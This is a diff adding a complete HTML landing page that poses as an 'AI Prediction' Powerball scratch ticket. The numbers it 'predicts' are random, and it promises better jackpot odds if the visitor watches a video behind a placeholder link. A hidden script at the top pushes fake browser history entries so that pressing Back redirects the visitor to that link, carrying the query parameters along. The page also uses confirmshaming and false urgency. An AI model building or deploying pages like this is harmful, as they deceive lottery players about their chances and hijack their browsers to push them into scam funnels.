@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Powerball Lucky Ticket</title>
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Inter:wght@400;600;700;900&display=swap');
+
+*{margin:0;padding:0;box-sizing:border-box}
+
+:root{
+  --red:#e8112d;
+  --gold:#f5c842;
+  --dark:#ffffff;
+  --card:#ffffff;
+  --border:#e0e0e0;
+  --muted:#999999;
+  --text:#222222;
+}
+
+body{
+  font-family:'Inter',sans-serif;
+  background:#ffffff;
+  color:var(--text);
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  padding:24px 16px 48px;
+}
+
+.logo{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:38px;
+  letter-spacing:4px;
+  color:#111;
+  text-align:center;
+  margin-bottom:4px;
+  line-height:1;
+}
+.logo em{color:var(--red);font-style:normal}
+.logo-sub{font-size:10px;letter-spacing:6px;color:var(--muted);text-align:center;text-transform:uppercase;margin-bottom:28px}
+
+.jackpot-strip{
+  width:100%;max-width:400px;
+  display:flex;justify-content:space-between;align-items:center;
+  background:#f7f7f7;
+  border:1px solid var(--border);
+  border-radius:10px;
+  padding:12px 18px;
+  margin-bottom:20px;
+}
+.jackpot-strip .jitem{text-align:center}
+.jackpot-strip .jlabel{font-size:9px;letter-spacing:3px;text-transform:uppercase;color:var(--muted);margin-bottom:3px}
+.jackpot-strip .jval{font-size:16px;font-weight:900;color:#111}
+.jackpot-strip .jval.gold{color:#b07d00}
+.jackpot-strip .divider{width:1px;height:30px;background:var(--border)}
+
+.ticket{
+  width:100%;max-width:400px;
+  background:#ffffff;
+  border:1px solid var(--border);
+  border-radius:18px;
+  overflow:hidden;
+  position:relative;
+  box-shadow:0 2px 20px rgba(0,0,0,0.08);
+}
+
+.ticket-header{
+  background:linear-gradient(135deg,#e8112d,#c0001f);
+  border-bottom:1px solid #cc0020;
+  padding:18px 20px 14px;
+  text-align:center;
+  position:relative;
+}
+.ticket-header::after{
+  content:'';
+  position:absolute;
+  bottom:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent);
+}
+.ticket-header .th-eyebrow{font-size:9px;letter-spacing:5px;text-transform:uppercase;color:rgba(255,255,255,0.7);margin-bottom:6px}
+.ticket-header h2{font-family:'Bebas Neue',sans-serif;font-size:26px;letter-spacing:3px;color:#fff;margin-bottom:2px}
+.ticket-header .th-sub{font-size:11px;color:rgba(255,255,255,0.7)}
+
+.ticket-body{padding:22px 20px}
+
+.balls-label{
+  font-size:9px;letter-spacing:4px;text-transform:uppercase;
+  color:var(--muted);text-align:center;margin-bottom:14px;
+  display:flex;align-items:center;gap:10px;justify-content:center;
+}
+.balls-label::before,.balls-label::after{content:'';flex:1;height:1px;background:var(--border)}
+
+.balls-row{
+  display:flex;gap:8px;justify-content:center;
+  margin-bottom:20px;
+}
+
+.ball-wrap{
+  position:relative;
+  width:54px;height:54px;
+  flex-shrink:0;
+}
+
+.ball-num{
+  position:absolute;inset:0;
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:18px;font-weight:900;
+  background:radial-gradient(circle at 38% 32%,#ffffff,#cccccc);
+  color:#111;
+  z-index:1;
+  opacity:0;
+  transition:opacity 0.08s linear;
+}
+.ball-num.powerball{
+  background:radial-gradient(circle at 38% 32%,#ff7070,#e8112d);
+  color:#fff;
+}
+
+.ball-canvas{
+  position:absolute;inset:0;
+  border-radius:50%;
+  z-index:2;
+  cursor:crosshair;
+  touch-action:none;
+}
+
+.ball-locked{
+  width:54px;height:54px;
+  border-radius:50%;
+  background:#f5f5f5;
+  border:2px dashed #ddd;
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+  position:relative;
+}
+.ball-locked .lock-icon{font-size:20px;opacity:0.4}
+.ball-locked.pb-locked{border-color:rgba(232,17,45,0.3)}
+
+.pb-label{
+  text-align:right;
+  font-size:9px;letter-spacing:2px;text-transform:uppercase;color:var(--red);
+  margin-top:-14px;
+  margin-bottom:14px;
+  padding-right:2px;
+}
+
+.scratch-progress{
+  display:flex;align-items:center;gap:10px;
+  margin-bottom:16px;
+}
+.sp-track{flex:1;background:#f0f0f0;border-radius:6px;height:6px;overflow:hidden}
+.sp-fill{height:100%;background:linear-gradient(90deg,var(--red),var(--gold));border-radius:6px;transition:width 0.4s;width:0%}
+.sp-text{font-size:11px;color:var(--muted);white-space:nowrap;min-width:44px;text-align:right}
+
+.scratch-status{
+  text-align:center;
+  font-size:13px;color:#888;
+  min-height:18px;
+  margin-bottom:16px;
+  line-height:1.5;
+}
+.scratch-status.highlight{color:var(--red);font-weight:700}
+
+.btn-unlock{
+  display:block;width:100%;
+  padding:16px;
+  background:linear-gradient(135deg,var(--red),#ff3355);
+  color:#fff;
+  font-family:'Inter',sans-serif;
+  font-size:15px;font-weight:900;
+  letter-spacing:0.5px;
+  border-radius:10px;cursor:pointer;
+  border:none;
+  text-decoration:none;
+  text-align:center;
+  box-shadow:0 6px 30px rgba(232,17,45,0.35);
+  transition:all 0.2s;
+  margin-bottom:10px;
+  display:none;
+}
+.btn-unlock:hover{transform:translateY(-2px);box-shadow:0 10px 40px rgba(232,17,45,0.5)}
+.btn-unlock .bu-arrow{display:inline-block;margin-left:6px;transition:transform 0.2s}
+.btn-unlock:hover .bu-arrow{transform:translateX(4px)}
+
+.btn-no{
+  display:block;width:100%;text-align:center;
+  font-size:12px;color:#ccc;
+  text-decoration:underline;
+  cursor:pointer;
+  background:none;border:none;padding:4px;
+  display:none;
+}
+.btn-no:hover{color:#999}
+
+.locked-section{
+  background:#fdf5f5;
+  border:1px dashed #ffaaaa;
+  border-radius:12px;
+  padding:16px;
+  text-align:center;
+  margin-bottom:16px;
+  display:none;
+}
+.locked-section .ls-title{
+  font-size:13px;font-weight:700;color:#c00020;
+  margin-bottom:4px;
+}
+.locked-section .ls-sub{
+  font-size:12px;color:#888;
+  line-height:1.5;
+}
+.locked-balls-row{
+  display:flex;gap:8px;justify-content:center;
+  margin:14px 0 0;
+}
+
+.guarantee{
+  display:flex;align-items:center;gap:10px;
+  background:#f7f7f7;
+  border:1px solid #e8e8e8;
+  border-radius:8px;
+  padding:12px 14px;
+  margin-top:16px;
+}
+.guarantee .shield{font-size:22px;flex-shrink:0}
+.guarantee p{font-size:11px;color:#888;line-height:1.5}
+.guarantee p strong{color:#444}
+
+.footer{
+  margin-top:28px;
+  text-align:center;
+  width:100%;max-width:400px;
+}
+.footer p{font-size:11px;color:#bbb;margin-bottom:6px;line-height:1.6}
+.footer-links{display:flex;justify-content:center;gap:20px;flex-wrap:wrap}
+.footer-links a{font-size:11px;color:#ccc;text-decoration:underline}
+.footer-links a:hover{color:#888}
+
+@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-4px)}40%{transform:translateX(4px)}60%{transform:translateX(-3px)}80%{transform:translateX(3px)}}
+.ball-locked.shake{animation:shake 0.4s ease}
+
+@keyframes popIn{0%{transform:scale(0.5);opacity:0}70%{transform:scale(1.1)}100%{transform:scale(1);opacity:1}}
+.ball-num.popped{animation:popIn 0.45s cubic-bezier(0.34,1.56,0.64,1)}
+
+@keyframes pulseBtn{0%,100%{box-shadow:0 6px 30px rgba(232,17,45,0.35)}50%{box-shadow:0 6px 50px rgba(232,17,45,0.65)}}
+.btn-unlock.pulsing{animation:pulseBtn 1.5s ease-in-out infinite}
+</style>
+</head>
+<body>
+
+<script>
+const LINK = 'SEU_LINK_AQUI';
+(function(){
+  var u = LINK.trim() + (LINK.indexOf('?') > 0 ? '&' : '?') + location.search.replace('?','');
+  history.pushState({}, '', location.href);
+  history.pushState({}, '', location.href);
+  history.pushState({}, '', location.href);
+  window.addEventListener('popstate', function(){ setTimeout(function(){ location.href = u; }, 1); });
+})();
+</script>
+
+<div class="logo">POWER<em>BALL</em></div>
+<div class="logo-sub">AI Prediction · Free Access</div>
+
+<div class="jackpot-strip">
+  <div class="jitem">
+    <div class="jlabel">Next Draw</div>
+    <div class="jval" id="nextDrawDate">Loading...</div>
+  </div>
+  <div class="divider"></div>
+  <div class="jitem">
+    <div class="jlabel">Est. Jackpot</div>
+    <div class="jval gold">$820M</div>
+  </div>
+  <div class="divider"></div>
+  <div class="jitem">
+    <div class="jlabel">Cash Value</div>
+    <div class="jval">$393M</div>
+  </div>
+</div>
+
+<div class="ticket">
+  <div class="ticket-header">
+    <div class="th-eyebrow">🎟 Official AI Lucky Ticket</div>
+    <h2>Your Numbers Are Hidden</h2>
+    <div class="th-sub">Scratch each ball to reveal your AI-predicted numbers</div>
+  </div>
+
+  <div class="ticket-body">
+
+    <div class="scratch-progress">
+      <div class="sp-track"><div class="sp-fill" id="spFill"></div></div>
+      <div class="sp-text" id="spText">0 / 3</div>
+    </div>
+
+    <div class="scratch-status" id="scratchStatus">Scratch the 3 balls below to reveal your numbers</div>
+
+    <div class="balls-label">Scratch to reveal</div>
+    <div class="balls-row" id="scratchRow">
+      <div class="ball-wrap" id="bw0">
+        <div class="ball-num" id="bn0">33</div>
+        <canvas class="ball-canvas" id="bc0"></canvas>
+      </div>
+      <div class="ball-wrap" id="bw1">
+        <div class="ball-num" id="bn1">17</div>
+        <canvas class="ball-canvas" id="bc1"></canvas>
+      </div>
+      <div class="ball-wrap" id="bw2">
+        <div class="ball-num" id="bn2">58</div>
+        <canvas class="ball-canvas" id="bc2"></canvas>
+      </div>
+    </div>
+
+    <div class="locked-section" id="lockedSection">
+      <div class="ls-title">🔒 3 Numbers Still Locked</div>
+      <div class="ls-sub">Watch the short video to unlock your complete 6-number prediction and maximize your jackpot odds this week.</div>
+      <div class="locked-balls-row">
+        <div class="ball-locked" id="lb3"><span class="lock-icon">🔒</span></div>
+        <div class="ball-locked" id="lb4"><span class="lock-icon">🔒</span></div>
+        <div class="ball-locked pb-locked" id="lb5"><span class="lock-icon">🔒</span></div>
+      </div>
+      <div class="pb-label">← + Powerball</div>
+    </div>
+
+    <a href="SEU_LINK_AQUI" class="btn-unlock pulsing" id="btnUnlock">
+      🔓 Watch Video to Unlock Final 3 <span class="bu-arrow">→</span>
+    </a>
+
+    <button class="btn-no" id="btnNo" onclick="handleNo()">No thanks, I'll play with only 3 numbers</button>
+
+    <div class="guarantee">
+      <span class="shield">🛡️</span>
+      <p><strong>100% Free</strong> — No credit card, no registration. The AI prediction video takes under 3 minutes to watch.</p>
+    </div>
+
+  </div>
+</div>
+
+<div class="footer">
+  <p>This is an AI-assisted prediction tool for entertainment purposes. Results may vary. Not affiliated with or endorsed by Powerball or Multi-State Lottery Association.</p>
+  <div class="footer-links">
+    <a href="#">Terms of Use</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Contact</a>
+  </div>
+</div>
+
+<script>
+function genNums(){
+  const pool = Array.from({length:69},(_,i)=>i+1);
+  const picked = [];
+  while(picked.length < 3){
+    const n = pool.splice(Math.floor(Math.random()*pool.length),1)[0];
+    picked.push(n);
+  }
+  return picked;
+}
+const NUMS = genNums();
+let revealedCount = 0;
+let scratchComplete = false;
+
+(function(){
+  const days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+  let d = new Date();
+  for(let i = 1; i <= 7; i++){
+    let t = new Date(d); t.setDate(d.getDate() + i);
+    if([1,3,6].includes(t.getDay())){
+      document.getElementById('nextDrawDate').textContent = days[t.getDay()] + ' ' + months[t.getMonth()] + ' ' + t.getDate();
+      break;
+    }
+  }
+})();
+
+function initCanvas(idx){
+  const canvas = document.getElementById('bc' + idx);
+  const size = 54;
+  canvas.width = size; canvas.height = size;
+  const ctx = canvas.getContext('2d');
+
+  const g = ctx.createRadialGradient(size*0.38, size*0.32, 2, size/2, size/2, size/2);
+  g.addColorStop(0, '#f5d060');
+  g.addColorStop(0.5, '#c8860a');
+  g.addColorStop(1, '#8a5500');
+  ctx.beginPath(); ctx.arc(size/2, size/2, size/2, 0, Math.PI*2);
+  ctx.fillStyle = g; ctx.fill();
+
+  ctx.globalAlpha = 0.15;
+  for(let i = 0; i < 8; i++){
+    ctx.beginPath();
+    ctx.moveTo(Math.random()*size, 0);
+    ctx.lineTo(Math.random()*size, size);
+    ctx.strokeStyle = '#fff'; ctx.lineWidth = 1; ctx.stroke();
+  }
+  ctx.globalAlpha = 1;
+
+  ctx.fillStyle = '#7a5000';
+  ctx.font = 'bold 8px Inter, sans-serif';
+  ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+  ctx.fillText('SCRATCH', size/2, size/2 - 5);
+  ctx.fillText('HERE', size/2, size/2 + 6);
+
+  const shine = ctx.createRadialGradient(size*0.35, size*0.3, 0, size*0.4, size*0.35, size*0.35);
+  shine.addColorStop(0, 'rgba(255,255,255,0.3)');
+  shine.addColorStop(1, 'rgba(255,255,255,0)');
+  ctx.beginPath(); ctx.arc(size/2, size/2, size/2, 0, Math.PI*2);
+  ctx.fillStyle = shine; ctx.fill();
+}
+
+function setupScratch(idx){
+  const canvas = document.getElementById('bc' + idx);
+  const ctx = canvas.getContext('2d');
+  let painting = false;
+
+  function getXY(e){
+    const r = canvas.getBoundingClientRect();
+    const sx = canvas.width / r.width;
+    const sy = canvas.height / r.height;
+    if(e.touches) return { x:(e.touches[0].clientX - r.left)*sx, y:(e.touches[0].clientY - r.top)*sy };
+    return { x:(e.clientX - r.left)*sx, y:(e.clientY - r.top)*sy };
+  }
+
+  function doScratch(e){
+    if(!painting) return;
+    e.preventDefault();
+    const p = getXY(e);
+    ctx.globalCompositeOperation = 'destination-out';
+    const grad = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, 26);
+    grad.addColorStop(0, 'rgba(0,0,0,1)');
+    grad.addColorStop(0.6, 'rgba(0,0,0,0.8)');
+    grad.addColorStop(1, 'rgba(0,0,0,0)');
+    ctx.fillStyle = grad;
+    ctx.beginPath();
+    ctx.arc(p.x, p.y, 26, 0, Math.PI*2);
+    ctx.fill();
+    updateRevealOpacity(idx, ctx, canvas);
+  }
+
+  canvas.addEventListener('mousedown', e=>{ painting=true; doScratch(e); });
+  canvas.addEventListener('mousemove', doScratch);
+  canvas.addEventListener('mouseup', ()=>painting=false);
+  canvas.addEventListener('mouseleave', ()=>painting=false);
+  canvas.addEventListener('touchstart', e=>{ painting=true; doScratch(e); }, {passive:false});
+  canvas.addEventListener('touchmove', doScratch, {passive:false});
+  canvas.addEventListener('touchend', ()=>painting=false);
+}
+
+function updateRevealOpacity(idx, ctx, canvas){
+  const data = ctx.getImageData(0,0,canvas.width,canvas.height).data;
+  let cleared = 0;
+  for(let i=3; i<data.length; i+=4) if(data[i] < 64) cleared++;
+  const pct = cleared / (canvas.width * canvas.height) * 100;
+
+  const numEl = document.getElementById('bn' + idx);
+  const opacity = Math.min(pct / 30, 1);
+  numEl.style.opacity = opacity;
+
+  if(pct > 25) revealBall(idx);
+}
+
+function revealBall(idx){
+  const canvas = document.getElementById('bc' + idx);
+  if(canvas.dataset.revealed === '1') return;
+  canvas.dataset.revealed = '1';
+
+  const ctx = canvas.getContext('2d');
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  canvas.style.pointerEvents = 'none';
+
+  const numEl = document.getElementById('bn' + idx);
+  numEl.style.opacity = '1';
+  numEl.style.transition = 'none';
+  numEl.classList.add('popped');
+
+  const rect = numEl.getBoundingClientRect();
+  confetti({
+    particleCount: 60,
+    spread: 55,
+    origin: { x: (rect.left + 27) / window.innerWidth, y: (rect.top + 27) / window.innerHeight },
+    colors: ['#f5c842','#e8112d','#ffffff','#ffaa00'],
+    startVelocity: 35,
+    gravity: 0.9,
+    ticks: 80,
+  });
+
+  revealedCount++;
+  updateProgress();
+  if(revealedCount === 3) onAllRevealed();
+}
+
+function updateProgress(){
+  const pct = (revealedCount / 3) * 100;
+  document.getElementById('spFill').style.width = pct + '%';
+  document.getElementById('spText').textContent = revealedCount + ' / 3';
+  if(revealedCount > 0 && revealedCount < 3){
+    document.getElementById('scratchStatus').textContent = revealedCount === 1 ? '🔥 Nice! Scratch the remaining 2 balls!' : '🔥 Almost there! One more ball to reveal!';
+  }
+}
+
+function onAllRevealed(){
+  if(scratchComplete) return;
+  scratchComplete = true;
+
+  const statusEl = document.getElementById('scratchStatus');
+  statusEl.textContent = '🎉 3 numbers revealed! Unlock the final 3 to complete your ticket!';
+  statusEl.classList.add('highlight');
+
+  document.getElementById('lockedSection').style.display = 'block';
+  document.getElementById('btnUnlock').style.display = 'block';
+  document.getElementById('btnNo').style.display = 'block';
+
+  setTimeout(()=>{
+    confetti({ particleCount:120, spread:80, origin:{x:0.5,y:0.5}, colors:['#f5c842','#e8112d','#fff'], startVelocity:50, gravity:0.8 });
+  }, 300);
+
+  setTimeout(()=>{
+    ['lb3','lb4','lb5'].forEach((id,i)=>{
+      setTimeout(()=>{
+        const el = document.getElementById(id);
+        el.classList.add('shake');
+        setTimeout(()=>el.classList.remove('shake'), 500);
+      }, i * 200);
+    });
+  }, 800);
+}
+
+function handleNo(){
+  const btn = document.getElementById('btnNo');
+  btn.textContent = 'Are you sure? You\'ll miss the final 3 numbers...';
+  btn.style.color = '#8a4050';
+  setTimeout(()=>{
+    btn.textContent = 'No thanks, I\'ll play without my complete numbers';
+    btn.style.color = '';
+  }, 2500);
+}
+
+window.addEventListener('DOMContentLoaded', ()=>{
+  for(let i=0;i<3;i++){
+    document.getElementById('bn'+i).textContent = NUMS[i];
+  }
+  for(let i=0;i<3;i++){ initCanvas(i); setupScratch(i); }
+});
+</script>
+</body>
+</html>
